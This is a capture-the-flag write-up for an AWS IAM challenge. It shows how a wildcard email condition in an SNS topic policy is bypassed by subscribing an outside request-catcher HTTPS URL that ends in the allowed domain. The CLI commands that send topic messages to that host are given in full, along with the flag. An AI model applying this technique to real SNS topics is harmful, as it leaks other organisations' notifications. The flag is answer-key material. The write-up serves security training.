# Challenge Number: 3

## Challenge Statement:
Enable Push Notifications
We got a message for you. Can you get it?
---

## IAM Policy:

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

---

## What do I have access to?

- I can subscribe to the SNS topic TBICWizPushNotifications if my email ends with @tbic.wiz.io

---

## What don't I have access to?

- I cannot initiate messages, or delete the topic. I also cannot subscribe with an email outside tbic.wiz.io
---

## What do I find interesting?

- The policy allows anyone to try subscribing, but only @tbic.wiz.io emails work. I’ve tried to access outside @tbic.wiz.io email but it will create an error.

---

## Solution:

To find the flag, I’ve taken the following steps:

a.	I have go through to the IAM Policy and research about "Action": "SNS:Subscribe". SNS stands for Simple Notification Service and it subscribes an endpoint to an SNS topic. Link to the reference AWS documentation is shown below.
-	https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sns/subscribe.html

b.	Based on the AWS CLI command syntax, the topic is given on the IAM Policy as “arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications” with an endpoint type as email.

c.	The initial command I’ve tried is to subscribe to the endpoint given the email protocol:
   ```
   aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol email \
    --notification-endpoint *@tbic.wiz.io
   ```

d.	However, the confirmation is pending. The output returned as:
```
"SubscriptionArn": "pending confirmation"
```

e.	The problem is how to confirm or even retrieve the email message. 

f.	After few hours, I’ve tried the endpoint as https and research further about it. An HTTP endpoint is a URL use to send or receive data. There are several HTTP endpoint online generator that I’ve tested such as Webhook, Beeceptor, and Request Catcher.

g.	In Request Catcher website, a URL can be generated online and will be used as endpoint. Copy the generated URL and use it to complete command as shown below. Note however that it is required to append the “@tbic.wiz.io” at the end of the generated URL.
```
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://dexter.requestcatcher.com/test@tbic.wiz.io
```

h.	After running the command in AWS CLI, it will return a message to the generated URL in Request Catcher as follows:
```
{
  "Type" : "SubscriptionConfirmation",
  "MessageId" : "0855438a-4f7b-4277-964e-77f253823a15",
  "Token" : "2336412f37fb687f5d51e6e2425a8a587149894bade3909e4f0bd4f812f336dc88a54a52bf35c6e55212955d623580fe1481996aacb6cfc3c4a43372b0120def6fec43ed48fc3e9869992372b6364f4e5a953178a3936d05d4695463a33e91f9ed5611d207ff76922ec61f25774225589994db850d78f6da7b6d6a97780ac5dc",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.",
  "SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a587149894bade3909e4f0bd4f812f336dc88a54a52bf35c6e55212955d623580fe1481996aacb6cfc3c4a43372b0120def6fec43ed48fc3e9869992372b6364f4e5a953178a3936d05d4695463a33e91f9ed5611d207ff76922ec61f25774225589994db850d78f6da7b6d6a97780ac5dc",
  "Timestamp" : "2025-01-29T14:36:53.007Z",
  "SignatureVersion" : "1",
  "Signature" : "CygmjF+ayGAh5JlPRj6ft20aPXvwnWzGveKjTUzh4kurwkdty+bzO3+Yk4pdhTm1nz69q1n3oJX6nfa8uI3sqi2mQpGxz1ueNOOH3ZzN5DLBBdQ8+9pulTikacK3HRgIxvvtU0KZW9RFKIfnQEu8nrwKRyalRegm40XNvYJlAQy8H80LRtTKsDknF3S1k7sduIJwgQSmnpRXEFToyI2wpLFcqalqqS6yD48PLoNXpJhBNki2jJZNs2htwg9lEZDU9ckgivenq0kDwpgZUYDkOr+27vkY1XNJIb2W/at69e1GaIviwfROqzbQ26MyCje19N924iiSsr056eE4PVSvNA==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem"
}
```

i.	As per the message, visit the SubscribeURL to confirm the subscription.
```
https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a587149894bade3909e4f0bd4f812f336dc88a54a52bf35c6e55212955d623580fe1481996aacb6cfc3c4a43372b0120def6fec43ed48fc3e9869992372b6364f4e5a953178a3936d05d4695463a33e91f9ed5611d207ff76922ec61f25774225589994db850d78f6da7b6d6a97780ac5dc
```

j.	Open the SubscribeURL on another web browser. After few seconds, another message is displayed on the generated URL in Request Catcher. The message contains the flag.
   ```
   {
  "Type" : "Notification",
  "MessageId" : "3dc78ccd-9d71-5632-bac9-ecd9a2e1fb1e",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "{wiz:always-suspect-asterisks}",
  "Timestamp" : "2025-01-29T14:38:08.520Z",
  "SignatureVersion" : "1",
  "Signature" : "Ac1PUhmrR7SS0gL2bmMZOHZjSmRYAPYA2cU+RwYfLSadSsLj1005aj+jFU2R2f/H4sl+Mpl5MJZUekCLNG7X9ZEgEhbzDwRunQGVmrcio+sQ4YwmGodq69CdgfXiptIJhjSAY4k0q1h8USwu+8EwC3KYKLL9CmZzTun/M8Cn+IBb/PlS7Zyea33pEiwrDYYBSKZtwo67GZ044V/pCVazwoalokWHMzPphQU65CiCtus5MdKd/A28blLryGFm99WwfocLfNEv46olbwRba0U8Yvu2k0q0ecm1zRsXUcJzk9t4thVXXBQXf66IVLPqFwZUSP7/S64+AzvZ/FNjlszPjw==",
  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem",
  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:560856d0-f147-4b13-b4fd-b86370aab096"
}
   ```
---

## Reflection:

### What was your approach?
I read the IAM Policy and identified the service as Amazon Simple Notification Service (SNS). I’ve researched the command syntax regarding SNS Subscribe.

### What was the biggest challenge?
The biggest challenge is finding a solution using the email protocol which did not succeed.

### How did you overcome the challenges?
Based on the Amazon SNS:Subscribe documentation, the protocol can also be HTTP. I’ve go through this path and found several HTTP endpoint online generator. I’ve tested Webhook, Beeceptor, and Request Catcher. Request Catcher did the job successfully.

### What led to the breakthrough?
Although it also took some time, I realized that it is required to append @tbic.wiz.io into the endpoint.

### On the blue side, how can the learning be used to properly defend the important assets?
We should limit open access and always use conditions to restrict permissions to only trusted users.
